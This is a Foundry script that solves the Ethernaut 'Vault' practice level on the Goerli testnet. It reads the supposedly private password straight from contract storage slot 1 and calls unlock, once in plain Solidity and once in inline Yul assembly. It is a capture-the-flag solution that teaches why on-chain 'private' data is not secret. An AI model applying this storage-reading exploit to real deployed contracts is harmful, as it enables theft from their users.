// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function locked() external view returns (bool);

    function unlock(bytes32 _password) external;
}

contract VaultScript is EthernautScript {
    string network = "goerli";
    address level = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        console.log("locked", instance.locked());
        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));
        console.logBytes32(password);
        instance.unlock(password);
        console.log("locked", instance.locked());
    }

    function yulVersion() internal {
        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));

        assembly {
            let vault := sload(instance.slot)

            mstore(0, "unlock(bytes32)")
            mstore(0, keccak256(0, 15))
            mstore(4, password)
            let success := call(gas(), vault, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "locked()")
            mstore(0, keccak256(0, 8))
            pop(staticcall(gas(), vault, 0, 0x24, 0, 0x20))
            if iszero(eq(mload(0), 0)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
